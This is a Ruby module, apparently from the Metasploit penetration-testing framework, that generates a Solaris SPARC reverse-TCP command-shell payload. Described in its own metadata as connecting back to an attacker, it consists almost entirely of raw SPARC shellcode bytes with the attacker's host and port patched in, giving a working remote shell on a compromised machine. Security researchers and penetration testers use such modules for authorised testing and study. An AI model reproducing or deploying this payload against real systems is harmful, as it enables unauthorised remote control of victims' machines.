require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Solaris
module Sparc

module ShellReverseTcp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Solaris Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'vlad902',
			'Platform'      => 'solaris',
			'Arch'          => ARCH_SPARC,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell
		))
	end

	def generate
		port    = (datastore['RPORT'] || '0').to_i 
		host    = Rex::Socket.resolv_nbo_i(datastore['RHOST'] || '127.0.0.1')

		payload =
			"\x9c\x2b\xa0\x07\x98\x10\x20\x01\x96\x1a\xc0\x0b\x94\x1a\xc0\x0b" +
			"\x92\x10\x20\x02\x90\x10\x20\x02\x82\x10\x20\xe6\x91\xd0\x20\x08" +
			"\xd0\x23\xbf\xf8\x94\x10\x20\x03\x92\x10\x20\x09\x94\xa2\xa0\x01" +
			"\x82\x10\x20\x3e\x91\xd0\x20\x08\x12\xbf\xff\xfc\xd0\x03\xbf\xf8" +
			Rex::Arch::Sparc.set(0x20000 | port, "l0") +
			Rex::Arch::Sparc.set(host, "l1") +
			"\xe0\x3b\xbf\xf0\x92\x23\xa0\x10\x94\x10\x20\x10\x82\x10\x20\xeb" +
			"\x91\xd0\x20\x08\x94\x1a\xc0\x0b\x21\x0b\xd8\x9a\xa0\x14\x21\x6e" +
			"\x23\x0b\xdc\xda\x90\x23\xa0\x10\x92\x23\xa0\x08\xe0\x3b\xbf\xf0" +
			"\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
	end

end

end end end end end
